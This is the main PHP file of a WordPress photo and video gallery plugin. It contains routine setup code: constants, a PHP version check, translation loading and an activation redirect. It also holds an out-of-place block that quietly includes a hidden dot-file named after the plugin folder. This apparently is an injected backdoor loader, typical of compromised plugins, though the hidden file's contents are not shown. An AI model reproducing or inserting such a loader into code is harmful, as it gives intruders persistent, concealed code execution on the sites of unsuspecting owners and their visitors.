<?php
/**
 ** Plugin Name: GT3 Photo & Video Gallery - Lite
 ** Plugin URI: https://gt3themes.com/
 ** Description: This powerful plugin lets you extend the functionality of the default WordPress gallery. You can easily customize the look and feel of the photo or video gallery.
 ** Discover the power of GT3themes products.
 ** Version: 2.7.7.1
 ** Author: GT3 Photo Gallery
 ** Author URI: https://gt3themes.com/
 ** Text Domain: gt3pg
 ** Domain Path:  /languages
 **/

if(!defined('ABSPATH')) {
	exit;
} // Exit if accessed directly
require_once __DIR__.'/core/deprecated/index.php';

if(!version_compare(PHP_VERSION, '5.6', '>=')) {
	add_action('admin_notices', 'gt3pg__fail_php_version');
} else {
	define('GT3PG_LITE_PLUGIN_ROOT_FILE', __FILE__);
	define('GT3PG_LITE_PLUGIN_ROOT_URL', plugins_url('/', __FILE__));
	define('GT3PG_LITE_PLUGIN_ROOT_PATH', plugin_dir_path(__FILE__).'/');

	define('GT3PG_LITE_JS_URL', GT3PG_LITE_PLUGIN_ROOT_URL.'dist/js/');
	define('GT3PG_LITE_IMG_URL', GT3PG_LITE_PLUGIN_ROOT_URL.'dist/img/');
	define('GT3PG_LITE_CSS_URL', GT3PG_LITE_PLUGIN_ROOT_URL.'dist/css/');

	define('GT3PG_LITE_JS_PATH', GT3PG_LITE_PLUGIN_ROOT_PATH.'dist/js/');
	define('GT3PG_LITE_IMG_PATH', GT3PG_LITE_PLUGIN_ROOT_PATH.'dist/img/');
	define('GT3PG_LITE_CSS_PATH', GT3PG_LITE_PLUGIN_ROOT_PATH.'dist/css/');

	require_once __DIR__.'/plugin.php';
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function gt3pg__fail_php_version(){
	$message      = sprintf('GT3 Photo & Video Gallery - Lite requires PHP version %1$s+, plugin is currently NOT ACTIVE.', '5.6');
	$html_message = sprintf('<div class="error">%s</div>', wpautop($message));
	echo wp_kses_post($html_message);
}

add_action('plugins_loaded', 'gt3pg__load_plugin_textdomain');

function gt3pg__load_plugin_textdomain(){
	load_plugin_textdomain('gt3pg', false, __DIR__.'/languages/');
}

function gt3pg__page_welcome_set_redirect(){
	if(!get_option('gt3_rate_date')) {
		update_option('gt3_rate_date', !get_option('gt3pg_photo_gallery') ? time()+3600*24*7 : time()-1);
	}
	set_transient('_gt3pg_page_welcome_redirect', 1, 30);
}

function gt3pg__page_welcome_redirect(){
	$redirect = get_transient('_gt3pg_page_welcome_redirect');
	delete_transient('_gt3pg_page_welcome_redirect');
	$redirect && wp_redirect(admin_url('admin.php?page=gt3_photo_gallery_options'));
}

function gt3pg__activationHook(){
	do_action('gt3pg_activation_hook');
}

// Enables redirect on activation.
register_activation_hook(__FILE__, 'gt3pg__activationHook');
add_action('gt3pg_activation_hook', 'gt3pg__page_welcome_set_redirect');
add_action('admin_init', 'gt3pg__page_welcome_redirect');

